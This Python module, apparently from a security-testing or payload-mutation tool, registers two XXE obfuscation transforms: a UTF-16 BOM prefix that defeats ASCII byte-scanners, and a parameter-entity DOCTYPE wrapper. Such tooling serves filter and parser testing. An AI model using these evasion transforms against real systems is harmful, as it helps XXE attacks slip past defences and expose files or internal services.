"""XML external entity payload obfuscation."""
from __future__ import annotations

from . import Payload, register


@register(Payload(
    id="xxe_utf16_bom", category="xxe",
    explain="prefix a UTF-16 BOM so the parser decodes UTF-16",
    fidelity="differential",
))
def xxe_utf16_bom(payload: str) -> str:
    """Prefix the BOM character; the caller sends the body as UTF-16 bytes.

    An XML parser that sees the BOM decodes the whole document as UTF-16,
    while a byte-scanner reading ASCII sees NUL-interleaved noise.
    """
    return "\ufeff" + payload


@register(Payload(
    id="xxe_parameter_entity", category="xxe",
    explain="wrap in a parameter-entity declaration",
    fidelity="differential",
))
def xxe_parameter_entity(payload: str) -> str:
    """Wrap the payload in an internal parameter entity; leave existing decls."""
    if "<!ENTITY" in payload or payload.lstrip().startswith("<!DOCTYPE"):
        return payload
    return f'<!DOCTYPE x [<!ENTITY % a "{payload}">%a;]>'
